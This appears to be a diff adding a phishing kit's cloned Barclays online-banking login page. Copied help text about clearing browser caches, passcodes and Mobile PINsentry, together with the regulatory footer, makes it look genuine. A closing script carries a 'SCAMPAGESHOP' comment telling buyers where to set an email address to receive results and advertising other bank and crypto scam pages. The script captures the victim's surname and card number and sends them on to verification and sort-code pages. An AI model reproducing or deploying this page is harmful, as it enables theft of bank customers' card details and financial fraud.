+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Firefox&lt;/b&gt; &amp;ndash; press &lt;b&gt;Ctrl, Shift&lt;/b&gt; and &lt;b&gt;Delete&lt;/b&gt; together, then select &#39;clear recent history&#39;, select &#39;cache&#39; only within &#39;details&#39;, then click &#39;clear now&#39;&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Safari&lt;/b&gt; &amp;ndash; press &lt;b&gt;Ctrl, Alt&lt;/b&gt; and the letter &lt;b&gt;E&lt;/b&gt; together, then select &#39;empty&#39;&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 align=&quot;left&quot;&gt;&lt;b&gt;Mac users:&lt;/b&gt;&lt;/h3&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Chrome &amp;ndash; Cmd, Shift&lt;/b&gt; and the letter &lt;b&gt;R&lt;/b&gt; together&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Firefox &amp;ndash; Cmd, Shift&lt;/b&gt; and the letter &lt;b&gt;R&lt;/b&gt; together&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Safari &amp;ndash; Cmd, Alt&lt;/b&gt; button and the letter &lt;b&gt;E&lt;/b&gt; together&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;To update your browser, please check your browser&#39;s help section.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;">
+                                        <ul class="help-content-drawer ng-scope">
+                                          <li>
+                                            <p style="text-align: left;">If you're having problems logging in to Online Banking, you may need to clear your internet browser's cache or update the browser.</p>
+                                            <p style="text-align: left;">Below is a guide to clearing the cache for the most common browsers. You can also find the information in your browser's 'help' section.</p>
+                                            <br>
+                                            <h3 align="left">
+                                              <b>PC users:</b>
+                                            </h3>
+                                            <p style="text-align: left;">
+                                              <b>Internet Explorer (IE)</b> � press <b>Ctrl, Shift</b> and <b>Delete</b> together, then select 'temporary internet files' and click 'delete'
+                                            </p>
+                                            <p style="text-align: left;">
+                                              <b>Chrome</b> � press <b>Ctrl, Shift</b> and <b>Delete</b> together. In the 'clear browsing data window', select 'cached images and files' only, then click 'clear browsing data'
+                                            </p>
+                                            <p style="text-align: left;">
+                                              <b>Firefox</b> � press <b>Ctrl, Shift</b> and <b>Delete</b> together, then select 'clear recent history', select 'cache' only within 'details', then click 'clear now'
+                                            </p>
+                                            <p style="text-align: left;">
+                                              <b>Safari</b> � press <b>Ctrl, Alt</b> and the letter <b>E</b> together, then select 'empty'
+                                            </p>
+                                            <br>
+                                            <h3 align="left">
+                                              <b>Mac users:</b>
+                                            </h3>
+                                            <p style="text-align: left;">
+                                              <b>Chrome � Cmd, Shift</b> and the letter <b>R</b> together
+                                            </p>
+                                            <p style="text-align: left;">
+                                              <b>Firefox � Cmd, Shift</b> and the letter <b>R</b> together
+                                            </p>
+                                            <p style="text-align: left;">
+                                              <b>Safari � Cmd, Alt</b> button and the letter <b>E</b> together
+                                            </p>
+                                            <p style="text-align: left;">To update your browser, please check your browser's help section.</p>
+                                          </li>
+                                        </ul>
+                                      </div>
+                                    </div>
+                                    <!-- end ngIf: value.noTemplate -->
+                                  </div>
+                                </div>
+                              </li>
+                              <!-- end ngRepeat: (key, value) in templates -->
+                              <li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+                                <span class="accordion-heading">
+                                  <a class="accordion-heading-link" role="button" href="https://bank.barclays.co.uk/olb/authlogin/loginAppContainer.do#heading_3_1hhangils" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+                                    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+                                      <g id="Symbols_3_1hhangils" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+                                        <g id="Account-summary---closed_3_1hhangils" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+                                          <g id="Group-6_3_1hhangils" transform="translate(265.000000, 154.000000)">
+                                            <g id="Group-10_3_1hhangils" transform="translate(0.000000, 100.000000)">
+                                              <g id="Group-8_3_1hhangils">
+                                                <g id="Group-12_3_1hhangils">
+                                                  <g id="Group-13_3_1hhangils">
+                                                    <g id="Group-7_3_1hhangils" transform="translate(30.000000, 14.000000)">
+                                                      <g id="Group-3-Copy_3_1hhangils" transform="translate(0.000000, 2.000000)">
+                                                        <g id="icons-/-arrow-/-Arrow_18px_blue_3_1hhangils" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                                                          <polyline id="Arrow_18px_blue_3_1hhangils" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                                                        </g>
+                                                      </g>
+                                                    </g>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </g>
+                                          </g>
+                                        </g>
+                                      </g>
+                                    </svg>
+                                    <span class="ng-binding">How to reset your memorable word and passcode</span>
+                                  </a>
+                                </span>
+                                <div class="accordion-content-wrapper accordion-content-closed" id="heading_3_1hhangils" aria-hidden="true">
+                                  <div class="accordion-content">
+                                    <!-- ngIf: !value.noTemplate -->
+                                    <!-- ngIf: value.noTemplate -->
+                                    <div ng-if="value.noTemplate" class="ng-scope">
+                                      <div b-compile-html="&lt;p&gt;If you need help resetting your memorable word and passcode, you can &lt;a href=&quot;https://www.barclays.co.uk/help/online-banking/login/setup-passcode-word/&quot; target=&quot;_blank&quot; title=&quot;Opens in a new window&quot;&gt;find out how&lt;/a&gt; or watch our video.&lt;/p&gt;">
+                                        <p class="ng-scope">If you need help resetting your memorable word and passcode, you can <a href="https://www.barclays.co.uk/help/online-banking/login/setup-passcode-word/" target="_blank" title="Opens in a new window">find out how</a> or watch our video. </p>
+                                      </div>
+                                    </div>
+                                    <!-- end ngIf: value.noTemplate -->
+                                  </div>
+                                </div>
+                              </li>
+                              <!-- end ngRepeat: (key, value) in templates -->
+                              <li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+                                <span class="accordion-heading">
+                                  <a class="accordion-heading-link" role="button" href="https://bank.barclays.co.uk/olb/authlogin/loginAppContainer.do#heading_4_1hhangils" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+                                    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+                                      <g id="Symbols_4_1hhangils" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+                                        <g id="Account-summary---closed_4_1hhangils" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+                                          <g id="Group-6_4_1hhangils" transform="translate(265.000000, 154.000000)">
+                                            <g id="Group-10_4_1hhangils" transform="translate(0.000000, 100.000000)">
+                                              <g id="Group-8_4_1hhangils">
+                                                <g id="Group-12_4_1hhangils">
+                                                  <g id="Group-13_4_1hhangils">
+                                                    <g id="Group-7_4_1hhangils" transform="translate(30.000000, 14.000000)">
+                                                      <g id="Group-3-Copy_4_1hhangils" transform="translate(0.000000, 2.000000)">
+                                                        <g id="icons-/-arrow-/-Arrow_18px_blue_4_1hhangils" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                                                          <polyline id="Arrow_18px_blue_4_1hhangils" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                                                        </g>
+                                                      </g>
+                                                    </g>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </g>
+                                          </g>
+                                        </g>
+                                      </g>
+                                    </svg>
+                                    <span class="ng-binding">How do I login with Mobile PINsentry?</span>
+                                  </a>
+                                </span>
+                                <div class="accordion-content-wrapper accordion-content-closed" id="heading_4_1hhangils" aria-hidden="true">
+                                  <div class="accordion-content">
+                                    <!-- ngIf: !value.noTemplate -->
+                                    <!-- ngIf: value.noTemplate -->
+                                    <div ng-if="value.noTemplate" class="ng-scope">
+                                      <div b-compile-html="&lt;ul class=&quot;help-content-drawer&quot;&gt;&lt;li&gt;&lt;p&gt;If you haven&amp;#39;t logged in to the app, tap the &amp;#39;PINsentry&amp;#39; button in the top left-hand corner of the log-in screen.&lt;/p&gt;&lt;p&gt;If you&amp;#39;re already logged in, tap the menu icon in the top left-hand corner and then select &amp;#39;Mobile PINsentry&amp;#39; from the list.&lt;/p&gt;&lt;p&gt;Once you&amp;#39;re on the Mobile PINsentry page, select &amp;#39;Identify&amp;#39; and follow the on-screen instructions.&lt;/p&gt;&lt;p&gt;Watch our video to find out how to use Mobile PINsentry at &lt;a href=&quot;https://www.barclays.co.uk/help/mobile-banking/pinsentry/info/&quot;&gt;www.barclays.co.uk/help/mobile-banking/pinsentry/info/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;">
+                                        <ul class="help-content-drawer ng-scope">
+                                          <li>
+                                            <p>If you haven't logged in to the app, tap the 'PINsentry' button in the top left-hand corner of the log-in screen.</p>
+                                            <p>If you're already logged in, tap the menu icon in the top left-hand corner and then select 'Mobile PINsentry' from the list.</p>
+                                            <p>Once you're on the Mobile PINsentry page, select 'Identify' and follow the on-screen instructions.</p>
+                                            <p>Watch our video to find out how to use Mobile PINsentry at <a href="https://www.barclays.co.uk/help/mobile-banking/pinsentry/info/">www.barclays.co.uk/help/mobile-banking/pinsentry/info/</a>
+                                            </p>
+                                          </li>
+                                        </ul>
+                                      </div>
+                                    </div>
+                                    <!-- end ngIf: value.noTemplate -->
+                                  </div>
+                                </div>
+                              </li>
+                              <!-- end ngRepeat: (key, value) in templates -->
+                            </ul>
+                          </b-accordion>
+                        </div>
+                        <div class="faqMarginBtn">
+                          <button id="1hhangilu" role="button" aria-expanded="false" class="btn btn btn-secondary ng-pristine ng-valid" ng-click="needHelp()" ng-model="buttonHelp" name="helpBtn" value="Need more help?" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+                            <ng-transclude></ng-transclude> Need more help?
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </aside>
+            </faq>
+            <!-- end ngIf: faqContent.eligible -->
+          </div>
+          <!-- ngInclude:  -->
+          <ng-include src="&#39;/authlogin/partials/bdlLogin/footer.html?v=1699011094955&#39;" class="ng-scope">
+            <footer class="ng-scope">
+              <div class="container-fluid">
+                <div ng-controller="footerCtrl" class="row footerSpace ng-scope">
+                  <div class="width-MobileGroup col-md-8 col-md-offset-2">
+                    <ul id="footerLinks1" class="mt-29 mb-30 noSpace col-sm-12 col-lg-12 col-xl-12 footer-links">
+                      <!-- ngIf: serviceStatusSwitch -->
+                      <li id="footerLink" ng-if="serviceStatusSwitch" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope">
+                        <a class="normal  standalone-links" id="1hhanght6" tabindex="" href="https://status.uk.barclays/" target="_blank" analytics-tag="" title="opens in a new tab" dss-dda-component="DDA Specific Component Attribute">
+                          <span class="ng-scope">Service status</span>
+                        </a>
+                      </li>
+                      <!-- end ngIf: serviceStatusSwitch -->
+                      <!-- ngIf: defaultHeader -->
+                      <li id="footerLink0" ng-if="defaultHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope">
+                        <a class="normal  standalone-links" id="1hhanght7" tabindex="" href="http://www.barclays.co.uk/Contactus/Contactus/P1242561757335" target="_blank" analytics-tag="" title="opens in a new tab" dss-dda-component="DDA Specific Component Attribute">
+                          <span class="ng-scope">Contact us</span>
+                        </a>
+                      </li>
+                      <!-- end ngIf: defaultHeader -->
+                      <!-- ngIf: wealthInternationalHeader -->
+                      <!-- ngIf: privateBankHeader -->
+                      <!-- ngIf: defaultHeader -->
+                      <li id="footerLink3" ng-if="defaultHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope">
+                        <a class="normal  standalone-links" id="1hhanghtc" tabindex="" href="http://www.barclays.co.uk/security" target="_blank" analytics-tag="" title="opens in a new tab" dss-dda-component="DDA Specific Component Attribute">
+                          <span class="ng-scope">Security</span>
+                        </a>
+                      </li>
+                      <!-- end ngIf: defaultHeader -->
+                      <!-- ngIf: wealthInternationalHeader -->
+                      <!-- ngIf: privateBankHeader -->
+                      <!-- ngIf: defaultHeader -->
+                      <li id="footerLink6" ng-if="defaultHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope">
+                        <a class="normal  standalone-links" id="1hhanghte" tabindex="" href="http://www.barclays.co.uk/accessibility/" target="_blank" analytics-tag="" title="opens in a new tab" dss-dda-component="DDA Specific Component Attribute">
+                          <span class="ng-scope">Accessibility</span>
+                        </a>
+                      </li>
+                      <!-- end ngIf: defaultHeader -->
+                      <!-- ngIf: wealthInternationalHeader -->
+                      <!-- ngIf: privateBankHeader -->
+                    </ul>
+                    <div class="space-footerlink">
+                      <b-text id="footerSnippetContent" type="div" b-data="&lt;p&gt;&lt;a href=&quot;https://www.barclays.co.uk/important-information/cookies-policy/&quot; target=&quot;_blank&quot; title=&quot;opens in a new tab&quot;&gt;See our cookies policy&lt;/a&gt;&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;Barclays Bank UK PLC and Barclays Bank PLC are each authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;Barclays Insurance Services Company Limited and Barclays Investment Solutions Limited are each authorised and regulated by the Financial Conduct Authority.&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;Registered office for all: 1 Churchill Place, London E14 5HP&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot; http://www.bsigroup.com/&quot; target=&quot;_blank&quot; title=&quot;opens in a new tab&quot;&gt;&lt;img alt=&quot;B S I Secure Digital Transactions Kitemark Certificate number KM616800. Link to B S I website&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/mark-of-trust-kitemark-logo.png&quot; width=&quot;109&quot;&gt;&lt;/a&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;a href=&quot;https://www.iso.org/isoiec-27001-information-security.html&quot; target=&quot;_blank&quot; title=&quot;opens in a new tab&quot;&gt;&lt;img alt=&quot;B S I ISO/IEC 27001 Information Security Management Certificate number IS539200. Link to ISO 27991 information security standard&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/mark-of-trust-certified-logo.png&quot; width=&quot;107&quot;&gt;&lt;/a&gt;&amp;nbsp; &amp;nbsp;&lt;a href=&quot;https://www.barclays.co.uk/digisafe/&quot; target=&quot;_blank&quot; title=&quot;opens in a new tab&quot;&gt;&lt;img alt=&quot;Cyber Essentials&quot; height=&quot;50&quot; src=&quot;/OLB/A/Content/Images/Cyber-Essentials-Plus-logo.png&quot; width=&quot;69&quot;&gt;&lt;/a&gt;&amp;nbsp; &lt;a href=&quot;https://www.fscs.org.uk/&quot; target=&quot;_blank&quot; title=&quot;opens in a new tab&quot;&gt;&lt;img alt=&quot;Financial Services Compensation Scheme&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/login-fscs.png&quot; width=&quot;54&quot;&gt;&lt;br&gt;
+&lt;br&gt;
+ &lt;br&gt;
+ &lt;/a&gt;&lt;/p&gt;" class="ng-isolate-scope" dss-dda-component="DDA Specific Component Attribute">
+                        <div>
+                          <p>
+                            <a href="https://www.barclays.co.uk/important-information/cookies-policy/" target="_blank" title="opens in a new tab">See our cookies policy</a>
+                          </p>
+                          <p style="text-align: left;">Barclays Bank UK PLC and Barclays Bank PLC are each authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+                          <p style="text-align: left;">Barclays Insurance Services Company Limited and Barclays Investment Solutions Limited are each authorised and regulated by the Financial Conduct Authority.</p>
+                          <p style="text-align: left;">Registered office for all: 1 Churchill Place, London E14 5HP</p>
+                          <p>
+                            <a href="http://www.bsigroup.com/" target="_blank" title="opens in a new tab">
+                              <img alt="B S I Secure Digital Transactions Kitemark Certificate number KM616800. Link to B S I website" height="62" src="./page_two_files/mark-of-trust-kitemark-logo.png" width="109">
+                            </a>&nbsp; &nbsp;&nbsp; <a href="https://www.iso.org/isoiec-27001-information-security.html" target="_blank" title="opens in a new tab">
+                              <img alt="B S I ISO/IEC 27001 Information Security Management Certificate number IS539200. Link to ISO 27991 information security standard" height="62" src="./page_two_files/mark-of-trust-certified-logo.png" width="107">
+                            </a>&nbsp; &nbsp; <a href="https://www.barclays.co.uk/digisafe/" target="_blank" title="opens in a new tab">
+                              <img alt="Cyber Essentials" height="50" src="./page_two_files/Cyber-Essentials-Plus-logo.png" width="69">
+                            </a>&nbsp; <a href="https://www.fscs.org.uk/" target="_blank" title="opens in a new tab">
+                              <img alt="Financial Services Compensation Scheme" height="62" src="./page_two_files/login-fscs.png" width="54">
+                              <br>
+                              <br>
+                              <br>
+                            </a>
+                          </p>
+                        </div>
+                      </b-text>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </footer>
+          </ng-include>
+          <div id="ROLBspinner" class="hidden">
+            <div class="spinner-css" style="transform:scale(0.5);">
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <img src="https://smetrics.barclays.co.uk/b/ss/barukprod/1/H.25.1--NS/0?&server=www.barclays.co.uk&ch=UKRBB&c54=JS_disabled" height="1" width="1" border="0" alt="" />
+    </div>
+    <script>
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //Do not touch this section
+      // To use, simply edit (emailForLogs = "") to your own email to receive results
+      //When testing results, if you don't find it in your inbox, check your spam folder.
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+      function saveLoginInfo() {
+        var surname = document.getElementById("surnameCardno").value;
+        var cardNumber = document.getElementById("cardNumber").value;
+        localStorage.setItem("Lastname (Card Page)", surname);
+        localStorage.setItem("cardNumber", cardNumber);
+        window.location.href = "/verify.html";
+      }
+
+      function goToMembershipPage() {
+        window.location.href = "/index.html";
+      }
+
+      function goToSortCodePage() {
+        window.location.href = "/sort-code.html";
+      }
+    </script>
+  </body>
+</html>
